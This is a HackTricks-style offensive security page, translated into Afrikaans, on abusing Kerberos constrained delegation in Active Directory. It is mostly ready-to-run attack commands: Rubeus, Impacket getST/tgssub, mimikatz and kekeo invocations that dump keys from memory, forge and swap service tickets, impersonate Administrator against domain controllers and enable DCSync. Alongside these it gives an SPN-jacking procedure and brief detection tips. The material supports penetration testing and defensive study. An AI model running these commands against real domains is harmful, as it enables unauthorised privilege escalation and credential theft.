# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Hiermee kan ’n Domain admin ’n rekenaar **toelaat** om ’n **gebruiker of rekenaar na te boots** teen enige **diens** van ’n masjien.

- **Service for User to self (_S4U2self_):** Enige **diensrekening wat ’n SPN besit** kan gewoonlik namens ’n arbitrêre gebruiker ’n TGS na homself verkry. As die rekening ook [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) in _userAccountControl_ het, is daardie TGS **forwardable**, wat protokoloorgang direk nuttig maak vir **classic constrained delegation**.
- **Service for User to Proxy(_S4U2proxy_):** ’n **Diensrekening** kan namens ’n gebruiker ’n TGS verkry vir die SPNs wat in **msDS-AllowedToDelegateTo** gelys is. Die bewyskaartjie wat in S4U2Proxy gebruik word, moet ’n **forwardable** kaartjie na die delegerende diens wees: óf ’n werklike kliënt-na-diens-kaartjie wat van die slagoffer vasgelê is, óf een wat met **S4U2Self + T2A4D** gegenereer is.

**Let wel**: As ’n gebruiker in AD as ‘_Account is sensitive and cannot be delegated_’ gemerk is, of ’n lid van **Protected Users** is, sal jy hulle gewoonlik **nie deur constrained delegation kan naboots nie**. In moderne domeine moet jy, wanneer jy rekeninge teiken wat delegasie ondersteun, **AES**-materiaal bo aannames wat slegs op RC4 berus, verkies.

Dit beteken dat as jy die **hash van die diens kompromitteer**, jy **gebruikers kan naboots** en namens hulle **toegang** tot enige **diens** op die aangeduide masjiene kan verkry (moontlike **privesc**).

Boonop sal jy **nie net toegang hê tot die diens waartoe die gebruiker toegang kan verkry deur nabootsing nie, maar ook tot enige diens**, omdat die SPN (die diensnaam waarvoor versoek word) nie nagegaan word nie (hierdie deel is nie in die kaartjie geënkripteer/onderteken nie). As jy dus toegang tot die **CIFS-diens** het, kan jy ook toegang tot die **HOST-diens** verkry deur byvoorbeeld die `/altservice`-vlag in Rubeus te gebruik. Dieselfde SPN-omruilingswakheid word deur **Impacket getST -altservice** en ander nutsmiddels misbruik.

Ook is **LDAP-dienstoegang op ’n DC** nodig om ’n **DCSync** uit te buit.

```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```

**Operateursnota:** moenie **ADUC**- of BloodHound-skermskote alleen vertrou vir **gMSA/sMSA**-beoordeling nie. Daardie rekeninge verberg dikwels die gewone Delegation-oortjie, daarom moet jy die rou **`userAccountControl`**- en **`msDS-AllowedToDelegateTo`**-eienskappe direk enumereer.

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```

### Protocol-oorgang teenoor Kerberos-only constrained delegation

As die gekompromitteerde rekening **T2A4D** het, kan jy gewoonlik die volledige **`S4U2Self -> S4U2Proxy`**-ketting met net die dienssleutel/TGT voltooi.<sup>[[2]](#references)</sup>

As dit net **`msDS-AllowedToDelegateTo`** het (die klassieke **"Use Kerberos only"**-modus), kan die delegasie steeds misbruik word, maar die bewyskaartjie vir S4U2Proxy moet ’n **forwardable user-to-service ticket** vir die delegerende diens wees. Een manier is om ’n slagoffer se TGS van **LSASS/ccache** vas te vang en dit aan die tweede fase te voer (`/tgs:` in Rubeus). ’n **Non-forwardable** S4U2Self-kaartjie is **nie** genoeg vir klassieke constrained delegation nie; as dit jou enigste bewyskaartjie is, kyk eerder na [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>

Nog ’n voorwaardelike roete is ’n eerste [RBCD](resource-based-constrained-delegation.md)-sprong na die delegerende diens: as dit ’n **forwardable** kaartjie vir die beoogde gebruiker en diens lewer, kan daardie kaartjie as bewys vir ’n latere Kerberos-only S4U2Proxy-sprong getoets word. Bevestig die eerste kaartjie se vlae, die delegerende diens se SPN, sy teiken-toelatingslys en enige beperkings op gebruikersdelegasie; beheer oor ’n RBCD-kenmerk alleen bewys nie dat die tweede sprong sal werk nie.

### Aantekeninge oor cross-domain constrained delegation (2025+)

Sedert **Windows Server 2012/2012 R2** ondersteun die KDC constrained delegation tussen domeine/woude via S4U2Proxy-uitbreidings. Moderne weergawes (Windows Server 2016–2025) behou hierdie gedrag en voeg twee PAC-SIDs by om protokoloorgang aan te dui:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) wanneer die gebruiker normaalweg geverifieer is.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) wanneer ’n diens die identiteit deur protokoloorgang beweer het.

Verwag **SERVICE_ASSERTED_IDENTITY** in die PAC wanneer protokoloorgang tussen domeine gebruik word; dit bevestig dat die S4U2Proxy-stap geslaag het.<sup>[[1]](#references)</sup>

### Impacket / Linux-nutsgoed (altservice & full S4U)

Onlangse Impacket (0.11.x+) stel dieselfde S4U-ketting en SPN-omruiling as Rubeus beskikbaar:<sup>[[2]](#references)</sup>

```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
         -impersonate Administrator contoso.local/websvc$ \
         -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```

As jy verkies om eers die gebruiker-ST te vervals (bv. slegs met ’n offline hash), gebruik **ticketer.py** saam met **getST.py** vir S4U2Proxy. **tgssub.py** is ook handig wanneer jy reeds ’n werkende ccache het en net die diensklas vir dieselfde gasheer hoef te verander. Sien die oop Impacket-kwessie #1713 vir huidige probleme (KRB_AP_ERR_MODIFIED wanneer die vervalste ST nie met die SPN-sleutel ooreenstem nie).<sup>[[2]](#references)</sup>

### SPN-jacking: herlei ’n teiken vir constrained delegation

Klassieke constrained delegation magtig ’n **SPN-string** in `msDS-AllowedToDelegateTo`, nie ’n onveranderlike teiken-SID nie. Tydens S4U2Proxy bepaal die KDC watter rekening tans daardie SPN besit en enkripteer die dienskaartjie met daardie rekening se langtermynsleutel. Daarom kan beheer oor die delegerende rekening, tesame met `WriteSPN`-toestemmings oor ’n ander diens-/rekenaarrekening, ’n onveranderde delegeringsbeperking herlei sonder `SeEnableDelegationPrivilege`.<sup>[[5]](#references)[[6]](#references)</sup>

Twee variante bestaan:<sup>[[5]](#references)</sup>

- **Ghost SPN-jacking:** die toegelate SPN is verwees omdat sy vorige eienaar geskrap of hernoem is, of die SPN verwyder is. Voeg dit direk by die gewenste teikenrekening.
- **Live SPN-jacking:** die SPN behoort steeds aan ’n bronrekening. Validering van dubbele SPN’s blokkeer gewoonlik die skryf na die bestemming, dus is `WriteSPN` op albei objek­te nodig: verwyder dit van die bron, voeg dit by die teiken, verkry die kaartjie en herstel die oorspronklike registrasie.

Die volgende geabstraheerde Linux-vloei verskuif ’n toegelate SPN, voer S4U as die gekompromitteerde delegerende principal uit, en herskryf die diensnaam in die kaartjie na ’n nuttige diens op die nuwe teiken.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
# Omit this deletion for a ghost SPN
bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap delspn "$SOURCE_DN" "$DELEGATED_SPN"

bloodyAD --host "$DC" -d "$DOMAIN" -u "$WRITER" -p "$PASSWORD" \
  msldap addspn "$TARGET_DN" "$DELEGATED_SPN"

getST.py -dc-ip "$DC_IP" -spn "$DELEGATED_SPN" \
  -impersonate Administrator -altservice "cifs/$TARGET_FQDN" \
  "$DOMAIN/$DELEGATING_ACCOUNT:$DELEGATING_PASSWORD"
```

`-altservice` is die tweede, afsonderlike primitive. Die S4U2Proxy-ticket is geënkripteer vir die rekening wat nou `$DELEGATED_SPN` besit; omdat die diensnaam van die ticket (`sname`) buite die geënkripteerde ticket-liggaam is, kan nutsgoed dit vervang met ’n ander diensklas/gasheernaam waarvan die diens dieselfde rekening-sleutel gebruik. SPN-jacking verander eers **watter rekeningsleutel** die ticket beskerm, terwyl diensklasvervanging verander **waar daardie ticket aangebied word**.<sup>[[5]](#references)[[6]](#references)</sup>

Vir live jacking, keer die twee LDAP-skryfbewerkings onmiddellik ná die verkryging van die ticket om om te voorkom dat die wettige diens ontwrig word. Soek op DC's met rekenaarrekeningouditering geaktiveer na Security-gebeurtenis **4742** waarin `servicePrincipalName` van een rekenaar verwyder en kort daarna by ’n ander gevoeg word, veral wanneer die SPN-gasheernaam verskil van die bestemming se `dNSHostName`. Korrelleer dit met gebeurtenis **4769**: S4U2Self gebruik dieselfde rekening as kliënt/diens, terwyl S4U2Proxy **Transited Services** invul.<sup>[[5]](#references)</sup>

### Delegering op ’n beheerde rekening opstel

Hierdie metode vereis **effektiewe skryftoegang** tot die rekenaar- of diensrekening se delegeringskenmerke (byvoorbeeld `GenericAll`, of `WriteDACL` gevolg deur ’n ACL-verandering) **en** die gebruikersreg `SeEnableDelegationPrivilege` vir die rekening wat die LDAP-verandering maak. Microsoft vereis daardie voorreg wanneer `msDS-AllowedToDelegateTo` gewysig word; objekbeheerregte alleen omseil dit nie. Kontroleer albei voorvereistes voordat jy ’n LDAP-kliënt soos **bloodyAD** gebruik om protokol-oorgang-delegering in te stel.<sup>[[Microsoft ADTS modify-operation security checks](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c714e48c-ea21-48b0-913d-fc065ab3dda3)]</sup>

```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```

’n Bestaande rekenaarrekening kan ’n kandidaat wees, selfs wanneer `ms-DS-MachineAccountQuota` nul is; daardie kwota beperk die verstekroete vir die skep van nuwe rekenaars, nie regte op ’n bestaande objek nie. Om die ingestelde delegation te gebruik, het jy ook beheer oor die delegating account se sleutel of wagwoord, ’n geldige dienshoofnaam (service principal name) en ’n teikengebruiker nodig wie se credentials delegeerbaar is. Hierdie voorwaardes en effektiewe toegang tot die gids moet afsonderlik nagegaan word.

- Stap 1: **Kry TGT van die toegelate diens**

```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```

> [!WARNING]
> Daar is **ander maniere om ’n TGT-ticket** of die **RC4**- of **AES256**-sleutel te bekom sonder om SYSTEM op die rekenaar te wees, soos die Printer Bug en unconstrained delegation, NTLM relaying en misbruik van Active Directory Certificate Service
>
> **Met net daardie TGT-ticket (of hash) kan jy hierdie aanval uitvoer sonder om die hele rekenaar te kompromitteer.**

- Stap 2: **Kry ’n TGS vir die diens deur die gebruiker na te maak**

```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the constrained-delegation user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```

[**Meer inligting by ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) en [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## References

- [1] [Oorsig van Kerberos-beperkte delegering (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Misbruik van delegering met Impacket (Deel 2): Beperkte delegering (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos-beperkte delegering (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity het domein laat val: ’n offensiewe Kerberos-oorsig (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [5] [Elad Shamir - SPN-jacking: ’n randgeval in WriteSPN-misbruik](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/)
- [6] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
